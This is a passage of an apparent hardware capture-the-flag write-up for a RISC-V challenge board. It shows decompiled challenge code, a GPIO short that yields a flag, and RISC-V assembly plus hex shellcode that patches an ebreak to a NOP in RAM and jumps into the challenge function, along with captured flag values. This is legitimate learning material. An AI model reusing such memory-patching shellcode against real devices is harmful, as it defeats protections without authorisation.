  {
    v2 = 1;
    puts((int)"CHALLENGE: Checking if GPIO2 is shorted...\r");
    if ( !sub_2000006C(2) )
      puts((int)"woha...\r");
    for ( i = 0; ; ++i )
    {
      if ( i > 199 )
        goto LABEL_9;
      if ( sub_2000006C(2) )
        break;
      delay(0xAu);
    }
    v2 = 0;
LABEL_9:
    if ( v2 )
    {
      while ( 1 )
      {
        get_flag(0x1Bu, v0, 0x100u);
        printf("SOLVED! GPIO2 is connected to GND! Flag: %s\r\n", v0);
        delay(0x3E8u);
      }
    }
    delay(0x1F4u);
  }
}
```

Challenge requires you to connect pin 2 and GND (see pinouts secton of https://oshwlab.com/lckfb-team/coloreasypicox)

```
CHALLENGE: Checking if GPIO2 is shorted...
woha...
SOLVED! GPIO2 is connected to GND! Flag: 28638374408063068767720275419867018533577735193801
```

## Bypass the BP Challenge

This challenge requires setting up a debug probe. Dreg gave me a Pico1, so I flashed https://github.com/raspberrypi/debugprobe/releases/download/debugprobe-v2.2.3/debugprobe_on_pico.elf

Unfortunately the debug interface on the challenge hardware is broken (I tried multiple probes and different openocd versions with shorter cables), so I had to be creative. If I attach gdb I would bypass the `ebreak` by overwriting it with NOP:

```
set {short}0x20001B20 = 0x0001
```

We can reuse the `l` challenge for this, but it requires some effort. First we patch `ebreak` in RAM and then we jump to the bp challenge function:

```
.option arch, "rv32imac"
.global _boot
.text

_boot:
    /* t0 = 0x20001B20 */
    lui   t0, %hi(0x20001B20)
    addi  t0, t0, %lo(0x20001B20)
    
    /* patch ebreak to nop */
    addi  t1, x0, 1
    sh    t1, 0(t0)

    /* make CPU see patched instructions */
    fence.i
    
    /* tail call 0x20001AD8 */
    lui   t0, %hi(0x20001AD8)
    addi  t0, t0, %lo(0x20001AD8)
    jalr x0, 0(t0)
```

Shellcode:

```
b7 22 00 20 93 82 02 b2 13 03 10 00 23 90 62 00 0f 10 00 00 b7 22 00 20 93 82 82 ad 67 80 02 00
```

Flag: 14793798396167603610166369868299228288024593131342
